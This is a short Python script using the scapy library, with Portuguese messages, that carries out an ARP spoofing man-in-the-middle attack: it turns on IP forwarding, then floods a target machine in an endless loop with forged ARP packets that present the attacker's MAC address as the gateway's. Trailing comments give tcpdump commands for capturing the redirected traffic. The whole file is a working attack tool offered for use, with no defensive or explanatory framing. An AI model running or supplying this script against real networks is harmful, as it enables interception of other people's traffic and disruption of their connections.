from scapy.all import *

import sys
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "ff:ff:ff:ff:ff:ff"):
            return mac
Timeout = 2

if len(sys.argv) !=3:
    print("\nUse IP_ATTACK IP_GATEWAY em seguida IP_GATEWAY IP_ATTACK")
    sys.exit(1)

my_mac = get_mac_address()
if not my_mac:
    print("Não é possivel obter o MAC")
    sys.exit(1)

packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])

while (True):
    srp(packet)

#using:
#sudo tcpdump -i wlan0 -v | grep "www.google.com"
#sudo tcpdump -i wlan0 -w pcapfile.pcap
